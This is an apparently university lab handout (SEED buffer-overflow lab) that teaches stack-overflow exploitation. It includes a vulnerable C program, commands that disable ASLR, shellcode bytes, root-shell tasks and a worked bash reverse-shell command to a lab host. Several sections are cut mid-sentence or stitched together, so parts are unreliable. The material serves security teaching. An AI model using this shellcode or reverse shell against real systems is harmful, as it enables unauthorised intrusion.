<div class="section" id="overview">
<h2>Overview<a class="headerlink" href="#overview" title="Permalink to this headline">¶</a></h2>
<p>Buffer overflow is defined as the condition in which a program attempts
to write data beyond the boundary of a buffer. This vulnerability can be
used by a malicious user to alter the flow control of the program,
leading to the execution of malicious code. The objective of this lab is
for students to gain practical insights into this type of vulnerability,
and learn how to exploit the vulnerability in attacks.</p>
<p>In this lab, students will be given four different servers, each running
a program with a buffer-overflow vulnerability. Their task is to develop
a scheme to exploit the vulnerability and finally gain the root
privilege on these servers. In addition to the attacks, students will
also experiment with several countermeasures against buffer-overflow
attacks. Students need to evaluate whether the schemes work or not and
explain why. This lab covers the following topics:</p>
<ul class="simple">
<li>Buffer overflow vulnerability and attack</li>
<li>Stack layout in a function invocation</li>
<li>Address randomization, Non-executable stack, and StackGuard</li>
<li>Shellcode. We have a separate lab on how to write shellcode from
scratch.</li>
</ul>
<p><strong>Readings and videos.</strong> Detailed coverage of the buffer-overflow attack can be found in the
following:</p>
<ul class="simple">
<li>Chapter 4 of the SEED Book, Computer &amp; Internet Security: A Hands-on Approach, 2nd Edition, by
Wenliang Du. See details at <a class="reference external" href="https://www.handsonsecurity.net">https://www.handsonsecurity.net</a>.</li>
<li>Section 4 of the SEED Lecture at Udemy, A Hands-on Approach, by Wenliang
Du. See details at <a class="reference external" href="https://www.handsonsecurity.net/video.html">https://www.handsonsecurity.net/video.html</a>.</li>
</ul>
<p><strong>Lab environment.</strong> This lab has been tested on the SEED Ubuntu 20.04 VM. You can download a pre-built
image from the SEED website, and run the SEED VM on your own computer. However, most of the SEED
labs can be conducted on the cloud, and you can follow our instruction to create a SEED VM on the cloud.</p>
<p><strong>Note for instructors.</strong> Instructors can customize this lab by choosing values for <code class="docutils literal notranslate"><span class="pre">L1</span></code>, …,
<code class="docutils literal notranslate"><span class="pre">L4</span></code>. See Section&nbsp;2.2for details.
Depending on the background of students and the time allocated for this
lab, instructors can also make the Level-2, Level-3, and Level-4 tasks
(or some of them) optional. The Level-1 task is sufficient to cover the
basics of the buffer-overflow attacks. Levels 2 to 4 increase the attack
difficulties. All the countermeasure tasks are based on the Level-1
task, so skipping the other levels does not affect those tasks.</p>
</div>
<div class="section" id="lab-environment-setup">
<h2>Lab Environment Setup<a class="headerlink" href="#lab-environment-setup" title="Permalink to this headline">¶</a></h2>
<p>Please download the <code class="docutils literal notranslate"><span class="pre">Labsetup.zip</span></code> file to your VM from the lab’s
website, unzip it, and you will get a folder called <code class="docutils literal notranslate"><span class="pre">Labsetup</span></code>. All
the files needed for this lab are included in this folder.</p>
<div class="section" id="turning-off-countermeasures">
<h3>Turning off Countermeasures<a class="headerlink" href="#turning-off-countermeasures" title="Permalink to this headline">¶</a></h3>
<p>Before starting this lab, we need to make sure the address randomization
countermeasure is turned off; otherwise, the attack will be difficult.
You can do it using the following command:</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ sudo /sbin/sysctl -w kernel.randomize_va_space=0
</pre></div>
</div>
</div>
<div class="section" id="the-vulnerable-program">
<h3>The Vulnerable Program<a class="headerlink" href="#the-vulnerable-program" title="Permalink to this headline">¶</a></h3>
<p>The vulnerable program used in this lab is called <code class="docutils literal notranslate"><span class="pre">stack.c</span></code>, which is
in the <code class="docutils literal notranslate"><span class="pre">server-code</span></code> folder. This program has a buffer-overflow
vulnerability, and your job is to exploit this vulnerability and gain
the root privilege. The code listed below has some non-essential
information removed, so it is slightly different from what you get from
the lab setup file. Below is Listing 1: vulnerable program <code class="docutils literal notranslate"><span class="pre">stack.c</span></code>.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won&#39;t be able to use the solutions from the past.
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);          ✰

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];

    int length = fread(str, sizeof(char), 517, stdin);
    bof(str);
    fprintf(stdout, &quot;==== Returned Properly ====\n&quot;);
    return 1;
}
</pre></div>
</div>
<p>The above program has a buffer overflow vulnerability. It reads data
from the standard input, and then passes the data to another buffer in
the function bof(). The original input can have a maximum length of
<code class="docutils literal notranslate"><span class="pre">517</span></code> bytes, but the buffer in bof() is only <code class="docutils literal notranslate"><span class="pre">BUF_SIZE</span></code> bytes long,
which is less than <code class="docutils literal notranslate"><span class="pre">517</span></code>. Because strcpy() does not check boundaries,
buffer overflow will occur.</p>
<p>The program will run on a server with the root privilege, and its
standard input will be redirected to a TCP connection between the server
and a remote user. Therefore, the program actually gets its data from a
remote user. If users can exploit this buffer overflow vulnerability,
they can get a root shell on the server.</p>
<p><strong>Compilation.</strong> To compile the above vulnerable program, we need to turn off the
StackGuard and the non-executable stack protections using the
<code class="docutils literal notranslate"><span class="pre">-fno-stack-protector</span></code> and <code class="docutils literal notranslate"><span class="pre">&quot;-z</span> <span class="pre">execstack&quot;</span></code> options. The following
is an example of the compilation command (the <code class="docutils literal notranslate"><span class="pre">L1</span></code> environment
variable sets the value for the <code class="docutils literal notranslate"><span class="pre">BUF_SIZE</span></code> constant inside
<code class="docutils literal notranslate"><span class="pre">stack.c</span></code>).</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ gcc -DBUF_SIZE=$(L1) -o stack -z execstack -fno-stack-protector stack.c
</pre></div>
</div>
<p>We will compile the <code class="docutils literal notranslate"><span class="pre">stack</span></code> program into both 32-bit and 64-bit
binaries. Our pre-built Ubuntu 20.04 VM is a 64-bit VM, but it still
supports 32-bit binaries. All we need to do is to use the <code class="docutils literal notranslate"><span class="pre">-m32</span></code>
option in the <code class="docutils literal notranslate"><span class="pre">gcc</span></code> command. For 32-bit compilation, we also use
<code class="docutils literal notranslate"><span class="pre">-static</span></code> to generate a statically-linked binary, which is
self-contained and not depending on any dynamic library, because the
32-bit dynamic libraries are not installed in our containers.</p>
<p>The compilation commands are already provided in <code class="docutils literal notranslate"><span class="pre">Makefile</span></code>. To
compile the code, you need to type <code class="docutils literal notranslate"><span class="pre">make</span></code> to execute those commands.
The variables <code class="docutils literal notranslate"><span class="pre">L1</span></code>, <code class="docutils literal notranslate"><span class="pre">L2</span></code>, <code class="docutils literal notranslate"><span class="pre">L3</span></code>, and <code class="docutils literal notranslate"><span class="pre">L4</span></code> are set in
<code class="docutils literal notranslate"><span class="pre">Makefile</span></code>; they will be used during the compilation. After the
compilation, we need to copy the binary into the <code class="docutils literal notranslate"><span class="pre">bof-containers</span></code>
folder, so they can be used by the containers. The following commands
conduct compilation and installation.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ make
$ make install
</pre></div>
</div>
<p><strong>For instructors (customization).</strong> To make the lab slightly different from the one offered in the past,
instructors can change the value for <code class="docutils literal notranslate"><span class="pre">BUF_SIZE</span></code> by requiring students
to compile the server code using different <code class="docutils literal notranslate"><span class="pre">BUF_SIZE</span></code> values. In
<code class="docutils literal notranslate"><span class="pre">Makefile</span></code>, the <code class="docutils literal notranslate"><span class="pre">BUF_SIZE</span></code> value is set by four variables <code class="docutils literal notranslate"><span class="pre">L1</span></code>,
…, <code class="docutils literal notranslate"><span class="pre">L4</span></code>. Instructors should pick the values for these variables
based on the following suggestions:</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">L1</span></code>: pick a number between 100 and 400</li>
<li><code class="docutils literal notranslate"><span class="pre">L2</span></code>: pick a number between 100 and 200</li>
<li><code class="docutils literal notranslate"><span class="pre">L3</span></code>: pick a number between 100 and 400</li>
<li><code class="docutils literal notranslate"><span class="pre">L4</span></code>: pick a number between 20 and 80; we need to keep this number
smaller, to make this level more challenging than the previous level.</li>
</ul>
<p><strong>The Server Program.</strong> In the <code class="docutils literal notranslate"><span class="pre">server-code</span></code> folder, you can find a program called
<code class="docutils literal notranslate"><span class="pre">server.c</span></code>. This is the main entry point of the server. It listens to
port <code class="docutils literal notranslate"><span class="pre">9090</span></code>. When it receives a TCP connection, it invokes the
<code class="docutils literal notranslate"><span class="pre">stack</span></code> program, and sets the TCP connection as the standard input of
the <code class="docutils literal notranslate"><span class="pre">stack</span></code> program. This way, when <code class="docutils literal notranslate"><span class="pre">stack</span></code> reads data from
<code class="docutils literal notranslate"><span class="pre">stdin</span></code>, it actually reads from the TCP connection, i.e. the data are
provided by the user on the TCP client side. It is not necessary for
students to read the source code of <code class="docutils literal notranslate"><span class="pre">server.c</span></code>.</p>
</div>
<div class="section" id="container-setup-and-commands">
<h3>Container Setup and Commands<a class="headerlink" href="#container-setup-and-commands" title="Permalink to this headline">¶</a></h3>
<p>Please download the Labsetup.zip file to your VM from the lab’s website, unzip it, enter the Labsetup
folder, and use the docker-compose.yml file to set up the lab environment. Detailed explanation of the
content in this file and all the involved Dockerfile can be found from the user manual, which is linked
to the website of this lab. If this is the first time you set up a SEED lab environment using containers, it is
very important that you read the user manual.</p>
<p>In the following, we list some of the commonly used commands related to Docker and Compose. Since
we are going to use these commands very frequently, we have created aliases for them in the .bashrc file
(in our provided SEEDUbuntu 20.04 VM).</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ docker-compose build   # Build the container image
$ docker-compose up      # Start the container
$ docker-compose down    # Shut down the container

// Aliases for the Compose commands above
$ dcbuild                # Alias for: docker-compose build
$ dcup                   # Alias for: docker-compose up
$ dcdown                 # Alias for: docker-compose down
</pre></div>
</div>
<p>All the containers will be running in the background. To run commands on a container, we often need
to get a shell on that container. We first need to use the “docker ps” command to find out the ID of
the container, and then use “docker exec” to start a shell on that container. We have created aliases for
them in the .bashrc file.</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>$ dockps         // Alias for: docker ps --format &quot;{{.ID}} {{.Names}}&quot;
$ docksh &lt;id&gt;    // Alias for: docker exec -it &lt;id&gt; /bin/bash

// The following example shows how to get a shell inside hostC
$ dockps
b1004832e275 hostA-10.9.0.5
0af4ea7a3e2e hostB-10.9.0.6
9652715c8e0a hostC-10.9.0.7

$ docksh 96
root@9652715c8e0a:/#

// Note: If a docker command requires a container ID, you do not need to
//       type the entire ID string. Typing the first few characters will
//       be sufficient, as long as they are unique among all the containers.
</pre></div>
</div>
<p>If you encounter problems when setting up the lab environment, please read the “Common Problems”
section of the manual for potential solutions.</p>
<p><strong>Note.</strong> It should be noted that before running <code class="docutils literal notranslate"><span class="pre">&quot;docker-compose</span> <span class="pre">build&quot;</span></code> to
build the docker images, we need to compile and copy the server code to
the <code class="docutils literal notranslate"><span class="pre">bof-containers</span></code> folder. This step is described in
Section&nbsp;2.2.</p>

<div class="section" id="task-1-get-familiar-with-the-shellcode">
<h2>Task 1: Get Familiar with the Shellcode<a class="headerlink" href="#task-1-get-familiar-with-the-shellcode" title="Permalink to this headline">¶</a></h2>
<p>The ultimate goal of buffer-overflow attacks is to inject malicious code
into the target program, so the code can be executed using the target
program’s privilege. Shellcode is widely used in most code-injection
attacks. Let us get familiar with it in this task.</p>
<p>Shellcode is typically used in code injection attacks. It is basically a piece of code that launches a shell,
and is usually written in assembly languages. In this lab, we only provide the binary version of a generic
shellcode, without explaining how it works, because it is non-trivial. If you are interested in how exactly
shellcode works, and want to write a shellcode from scratch, you can learn that from a separate SEED lab
called Shellcode Lab. Our generic shellcode is listed in the following (we only list the 32-bit version):</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>shellcode = (
   &quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;

   &quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;
   &quot;/bin/bash*&quot;                                                    ➊
   &quot;-c*&quot;                                                           ➋
   &quot;/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd       *&quot;    ➌
   # The * in this line serves as the position marker        *
   &quot;AAAA&quot; # Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;
   &quot;BBBB&quot; # Placeholder for argv[1] --&gt; &quot;-c&quot;

).encode(’latin-1’)
</pre></div>
</div>
<p>The shellcode runs the “/bin/bash” shell program (Line ➊), but it is given two arguments, “-c”
(Line ➋) and a command string (Line ➌). This indicates that the shell program will run the commands in the
second argument. The * at the end of these strings is only a placeholder, and it will be replaced by one byte
of 0x00 during the execution of the shellcode. Each string needs to have a zero at the end, but we cannot
put zeros in the shellcode. Instead, we put a placeholder at the end of each string, and then dynamically put
a zero in the placeholder during the execution.
If we want the shellcode to run some other commands, we just need to modify the command string
in Line ➌. However, when making changes, we need to make sure not to change the length of this string,
because the starting position of the placeholder for the argv[] array, which is right after the command
string, is hardcoded in the binary portion of the shellcode. If we change the length, we need to modify the
binary part. To keep the star at the end of this string at the same position, you can add or delete spaces.</p>
<p>You can find the generic shellcode in the <code class="docutils literal notranslate"><span class="pre">shellcode</span></code> folder. Inside,
you will see two Python programs, <code class="docutils literal notranslate"><span class="pre">shellcode_32.py</span></code> and
<code class="docutils literal notranslate"><span class="pre">shellcode_64.py</span></code>. They are for 32-bit and 64-bit shellcode,

to <code class="docutils literal notranslate"><span class="pre">codefile_32</span></code> and <code class="docutils literal notranslate"><span class="pre">codefile_64</span></code>, respectively. You can then use

<p><strong>Added randomness.</strong> We have added a little bit of randomness in the program, so different
students are likely to see different values for the buffer address and
frame pointer. The values only change when the container restarts, so as
long as you keep the container running, you will see the same numbers
(the numbers seen by different students are still different). This
randomness is different from the address-randomization countermeasure.
Its sole purpose is to make students’ work a little bit different.</p>

which is included in the lab setup file. The code is incomplete, and
students need to replace some of the essential values in the code.

<p>As you can see, the server only gives out one hint, the address of the
buffer; it does not reveal the value of the frame pointer. This means,
the size of the buffer is unknown to you. That makes exploiting the
vulnerability more difficult than the Level-1 attack. Although the
actual buffer size can be found in <code class="docutils literal notranslate"><span class="pre">Makefile</span></code>, you are not allowed to
use that information in the attack, because in the real world, it is
unlikely that you will have this file. To simplify the task, we do
assume that the the range of the buffer size is known. Another fact that
may be useful to you is that, due to the memory alignment, the value
stored in the frame pointer is always multiple of four (for 32-bit
programs).</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Range of the buffer size (in bytes): [100, 300]

this range. You will not get all the credits if you use the brute-force
method, i.e., trying one buffer size each time. The more you try, the
easier it will be detected and defeated by the victim. That’s why
minimizing the number of trials is important for attacks. In your lab

<p>You can see the values of the frame pointer and buffer’s address become
8 bytes long (instead of 4 bytes in 32-bit programs). Your job is to
construct your payload to exploit the buffer overflow vulnerability of
the server. You ultimate goal is to get a root shell on the target
server. You can use the shellcode from Task 1, but you need to use the
64-bit version of the shellcode.</p>
<p><strong>Challenges.</strong> Compared to buffer-overflow attacks on 32-bit machines, attacks on
64-bit machines is more difficult. The most difficult part is the
address. Although the x64 architecture supports 64-bit address space,
only the address from <code class="docutils literal notranslate"><span class="pre">0x00</span></code> through <code class="docutils literal notranslate"><span class="pre">0x00007FFFFFFFFFFF</span></code> is
allowed. That means for every address (8 bytes), the highest two bytes
are always zeros. This causes a problem.</p>
<p>In our buffer-overflow attacks, we need to store at least one address in
the payload, and the payload will be copied into the stack via
<code class="docutils literal notranslate"><span class="pre">strcpy()</span></code>. We know that the <code class="docutils literal notranslate"><span class="pre">strcpy()</span></code> function will stop copying
when it sees a zero. Therefore, if a zero appears in the middle of the
payload, the content after the zero cannot be copied into the stack. How
to solve this problem is the most difficult challenge in this attack. In
your report, you need to describe how you solve this problem.</p>

about 32 bytes (the actual distance in the lab may be different). In

<p>At the beginning of this lab, we turned off one of the countermeasures,
the Address Space Layout Randomization (ASLR). In this task, we will
turn it back on, and see how it affects the attack. You can run the

<p><strong>Defeating the 32-bit randomization.</strong> It was reported that on 32-bit
Linux machines, only 19 bites can be used
for address randomization. That is not enough, and we can easily hit the

machines, the number of bits used for randomization is significantly
increased.</p>
<p>In this task, we will give it a try on the 32-bit Level 1 server. We use
the brute-force approach to attack the server repeatedly, hoping that
the address we put in our payload can eventually be correct. We will use
the payload from the Level-1 attack. You can use the following shell
script to run the vulnerable program in an infinite loop. If you get a
reverse shell, the script will stop; otherwise, it will keep running. If

<h3>Task 7.b: Turn on the Non-executable Stack Protection<a class="headerlink" href="#task-7-b-turn-on-the-non-executable-stack-protection" title="Permalink to this headline">¶</a></h3>
<p>Operating systems used to allow executable stacks, but this has now changed: In Ubuntu OS, the binary
images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e.,
they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide
whether to make the stack of this running program executable or non-executable. This marking is done
automatically by the <code class="docutils literal notranslate"><span class="pre">gcc</span></code>, which by default makes stack non-executable. We can specifically make it nonexecutable using the “-z noexecstack” flag in the compilation. In our previous tasks, we used “-z
execstack” to make stacks executable.</p>
<p>In this task, we will make the stack non-executable. We will do this experiment in the <code class="docutils literal notranslate"><span class="pre">shellcode</span></code>
folder. The <code class="docutils literal notranslate"><span class="pre">call_shellcode</span></code> program puts a copy of shellcode on the stack, and then executes the code
from the stack. Please recompile <code class="docutils literal notranslate"><span class="pre">call_shellcode.c</span></code> into <code class="docutils literal notranslate"><span class="pre">a32.out</span></code> and <code class="docutils literal notranslate"><span class="pre">a64.out</span></code>, without the “-z
execstack” option. Run them, describe and explain your observations.</p>
<p><strong>Defeating the non-executable stack countermeasure.</strong> It should be noted that non-executable stack only
makes it impossible to run shellcode on the stack, but it does not prevent buffer-overflow attacks, because
there are other ways to run malicious code after exploiting a buffer-overflow vulnerability. The return-tolibc attack is an example. We have designed a separate lab for that attack. If you are interested, please see
our Return-to-Libc Attack Lab for details.</p>

<div class="section" id="guidelines-on-reverse-shell">
<h2>Guidelines on Reverse Shell<a class="headerlink" href="#guidelines-on-reverse-shell" title="Permalink to this headline">¶</a></h2>
<p>The key idea of reverse shell is to redirect its standard input, output, and error devices to a network connection, so the shell gets its input from the connection, and prints out its output also to the connection. At the
other end of the connection is a program run by the attacker; the program simply displays whatever comes
from the shell at the other end, and sends whatever is typed by the attacker to the shell, over the network
connection.</p>
<p>A commonly used program by attackers is netcat, which, if running with the “-l” option, becomes
a TCP server that listens for a connection on the specified port. This server program basically prints out
whatever is sent by the client, and sends to the client whatever is typed by the user running the server. In the
following experiment, netcat (nc for short) is used to listen for a connection on port 9090 (let us focus
only on the first line).</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Attacker(10.0.2.6):$ nc -nv -l 9090     ➙ Waiting for reverse shell
Listening on 0.0.0.0 9090
Connection received on 10.0.2.5 39452

Server(10.0.2.5):$ ifconfig

inet 10.0.2.5 netmask 255.255.255.0 broadcast 10.0.2.255
...
</pre></div>
</div>
<p>The above <code class="docutils literal notranslate"><span class="pre">nc</span></code> command will block, waiting for a connection. We now directly run the following bash
program on the Server machine (10.0.2.5) to emulate what attackers would run after compromising the
server via the Shellshock attack. This bash command will trigger a TCP connection to the attacker machine’s
port 9090, and a reverse shell will be created. We can see the shell prompt from the above result, indicating
that the shell is running on the Server machine; we can type the <code class="docutils literal notranslate"><span class="pre">ifconfig</span></code> command to verify that the IP
address is indeed 10.0.2.5, the one belonging to the Server machine. Here is the bash command:</p>
<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>Server(10.0.2.5):$ /bin/bash -i &gt; /dev/tcp/10.0.2.6/9090 0&lt;&amp;1 2&gt;&amp;1
</pre></div>
</div>
<p>The above command represents the one that would normally be executed on a compromised server. It is
quite complicated, and we give a detailed explanation in the following:</p>
<ul class="simple">
<li>“/bin/bash -i”: The option i stands for interactive, meaning that the shell must be interactive
(must provide a shell prompt).</li>
<li>“&gt; /dev/tcp/10.0.2.6/9090”: This causes the output device (stdout) of the shell to be
redirected to the TCP connection to 10.0.2.6’s port 9090. In Unix systems, stdout’s file
descriptor is 1.</li>
<li>“0&lt;&amp;1”: File descriptor 0 represents the standard input device (stdin). This option tells the system
to use the standard output device as the stardard input device. Since stdout is already redirected to
the TCP connection, this option basically indicates that the shell program will get its input from the
same TCP connection.</li>
<li>“2&gt;&amp;1”: File descriptor 2 represents the standard error stderr. This causes the error output to be
redirected to stdout, which is the TCP connection.</li>
</ul>
<p>In summary, the command “/bin/bash -i &gt; /dev/tcp/10.0.2.6/9090 0&lt;&amp;1 2&gt;&amp;1” starts
a bash shell on the server machine, with its input coming from a TCP connection, and output going to the
same TCP connection. In our experiment, when the bash shell command is executed on 10.0.2.5, it
connects back to the netcat process started on 10.0.2.6. This is confirmed via the “Connection
from 10.0.2.5 …” message displayed by netcat.</p>
